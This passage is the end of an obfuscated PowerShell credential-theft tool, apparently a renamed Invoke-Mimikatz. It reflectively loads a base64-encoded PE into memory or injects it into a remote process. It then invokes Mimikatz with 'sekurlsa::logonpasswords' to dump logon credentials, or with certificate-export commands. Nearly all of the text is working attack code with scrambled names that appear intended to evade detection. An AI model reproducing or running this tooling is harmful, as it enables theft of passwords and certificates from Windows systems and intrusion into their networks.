	
	Function probabilities
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$wGyvvcQf99
		)
		
		$Win32Constants = toed
		$cxFnWjaC99 = filbert
		$DIEZeRqh99 = stroked
		
		$PEInfo = splays -wGyvvcQf99 $wGyvvcQf99 -DIEZeRqh99 $DIEZeRqh99 -Win32Constants $Win32Constants
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$IHdWlnVG99 = Balzac ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ZGObOrvK99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IHdWlnVG99, [Type]$DIEZeRqh99.IMAGE_IMPORT_DESCRIPTOR)
				
				if ($ZGObOrvK99.Characteristics -eq 0 `
						-and $ZGObOrvK99.FirstThunk -eq 0 `
						-and $ZGObOrvK99.ForwarderChain -eq 0 `
						-and $ZGObOrvK99.Name -eq 0 `
						-and $ZGObOrvK99.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}
				$DUmJSAUs99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Balzac ([Int64]$PEInfo.PEHandle) ([Int64]$ZGObOrvK99.Name)))
				$sXKytSNo99 = $cxFnWjaC99.GetModuleHandle.Invoke($DUmJSAUs99)
				if ($sXKytSNo99 -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $DUmJSAUs99. Continuing anyways" -WarningAction Continue
				}
				
				$FdJKwcrL99 = $cxFnWjaC99.FreeLibrary.Invoke($sXKytSNo99)
				if ($FdJKwcrL99 -eq $false)
				{
					Write-Warning "Unable to free library: $DUmJSAUs99. Continuing anyways." -WarningAction Continue
				}
				
				$IHdWlnVG99 = Balzac ($IHdWlnVG99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DIEZeRqh99.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$yBtzFgSy99 = Balzac ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$XKeWHnnA99 = bucksaws @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$vzdlVxrF99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($yBtzFgSy99, $XKeWHnnA99)
		
		$vzdlVxrF99.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$FdJKwcrL99 = $cxFnWjaC99.VirtualFree.Invoke($wGyvvcQf99, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($FdJKwcrL99 -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}
	Function Main
	{
		$cxFnWjaC99 = filbert
		$DIEZeRqh99 = stroked
		$Win32Constants =  toed
		
		$lRZKwtTF99 = [IntPtr]::Zero
	
		if (($RUiYbjPF99 -ne $null) -and ($RUiYbjPF99 -ne 0) -and ($DvWuUDKk99 -ne $null) -and ($DvWuUDKk99 -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($DvWuUDKk99 -ne $null -and $DvWuUDKk99 -ne "")
		{
			$akCtfDuQ99 = @(Get-Process -Name $DvWuUDKk99 -ErrorAction SilentlyContinue)
			if ($akCtfDuQ99.Count -eq 0)
			{
				Throw "Can't find process $DvWuUDKk99"
			}
			elseif ($akCtfDuQ99.Count -gt 1)
			{
				$rBziOFfd99 = Get-Process | where { $_.Name -eq $DvWuUDKk99 } | Select-Object ProcessName, Id, SessionId
				Write-Output $rBziOFfd99
				Throw "More than one instance of $DvWuUDKk99 found, please specify the process ID to inject in to."
			}
			else
			{
				$RUiYbjPF99 = $akCtfDuQ99[0].ID
			}
		}
		
		
		if (($RUiYbjPF99 -ne $null) -and ($RUiYbjPF99 -ne 0))
		{
			$lRZKwtTF99 = $cxFnWjaC99.OpenProcess.Invoke(0x001F0FFF, $false, $RUiYbjPF99)
			if ($lRZKwtTF99 -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $RUiYbjPF99"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		
		Write-Verbose "Calling potted"
        try
        {
            $rFzAlAvh99 = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if ($rFzAlAvh99 -is [array])
        {
            $accvlCqg99 = $rFzAlAvh99[0]
        } else {
            $accvlCqg99 = $rFzAlAvh99
        }
        if ( ( $accvlCqg99.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $accvlCqg99.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$IKHGtPzF99 = [Byte[]][Convert]::FromBase64String($zeBVCOaZ99)
        }
        else
        {
            [Byte[]]$IKHGtPzF99 = [Byte[]][Convert]::FromBase64String($CnXqNcNq99)
        }
        $IKHGtPzF99[0] = 0
        $IKHGtPzF99[1] = 0
		$wGyvvcQf99 = [IntPtr]::Zero
		if ($lRZKwtTF99 -eq [IntPtr]::Zero)
		{
			$Xtxbehkh99 = potted -IKHGtPzF99 $IKHGtPzF99 -vamjTknO99 $vamjTknO99
		}
		else
		{
			$Xtxbehkh99 = potted -IKHGtPzF99 $IKHGtPzF99 -vamjTknO99 $vamjTknO99 -lRZKwtTF99 $lRZKwtTF99
		}
		if ($Xtxbehkh99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$wGyvvcQf99 = $Xtxbehkh99[0]
		$NBUuylwd99 = $Xtxbehkh99[1] #only matters if you loaded in to a remote process
		
		
		$PEInfo = splays -wGyvvcQf99 $wGyvvcQf99 -DIEZeRqh99 $DIEZeRqh99 -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($lRZKwtTF99 -eq [IntPtr]::Zero))
		{
                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]$tumxrzTQ99 = browned -wGyvvcQf99 $wGyvvcQf99 -FunctionName "powershell_reflective_mimikatz"
				    if ($tumxrzTQ99 -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $CnYrfLYV99 = bucksaws @([IntPtr]) ([IntPtr])
				    $joDFOXGg99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($tumxrzTQ99, $CnYrfLYV99)
                    $FQAYxlSP99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($vamjTknO99)
				    [IntPtr]$XaVZKIvR99 = $joDFOXGg99.Invoke($FQAYxlSP99)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FQAYxlSP99)
				    if ($XaVZKIvR99 -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $EdDGwyYa99 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($XaVZKIvR99)
				        Write-Output $EdDGwyYa99
				        $cxFnWjaC99.LocalFree.Invoke($XaVZKIvR99);
				    }
		}
		elseif (($PEInfo.FileType -ieq "DLL") -and ($lRZKwtTF99 -ne [IntPtr]::Zero))
		{
			$JwoCmUri99 = browned -wGyvvcQf99 $wGyvvcQf99 -FunctionName "VoidFunc"
			if (($JwoCmUri99 -eq $null) -or ($JwoCmUri99 -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$JwoCmUri99 = stalls $JwoCmUri99 $wGyvvcQf99
			$JwoCmUri99 = Balzac $JwoCmUri99 $NBUuylwd99
			
			$ESMoqUGA99 = utopia -vVbfBzxt99 $lRZKwtTF99 -StartAddress $JwoCmUri99 -cxFnWjaC99 $cxFnWjaC99
		}
		
		if ($lRZKwtTF99 -eq [IntPtr]::Zero)
		{
			probabilities -wGyvvcQf99 $wGyvvcQf99
		}
		else
		{
			$FdJKwcrL99 = $cxFnWjaC99.VirtualFree.Invoke($wGyvvcQf99, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($FdJKwcrL99 -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}
	Main
}
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$ToKsFNkd99  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
	{
		$vamjTknO99 = "sekurlsa::logonpasswords exit"
	}
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $vamjTknO99 = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $vamjTknO99 = $Command
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
	if ($hfhMDefS99 -eq $null -or $hfhMDefS99 -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $PvzjYTDP99 -ArgumentList @($zeBVCOaZ99, $CnXqNcNq99, "Void", 0, "", $vamjTknO99)
	}
	else
	{
		Invoke-Command -ScriptBlock $PvzjYTDP99 -ArgumentList @($zeBVCOaZ99, $CnXqNcNq99, "Void", 0, "", $vamjTknO99) -hfhMDefS99 $hfhMDefS99
	}
}
Main
}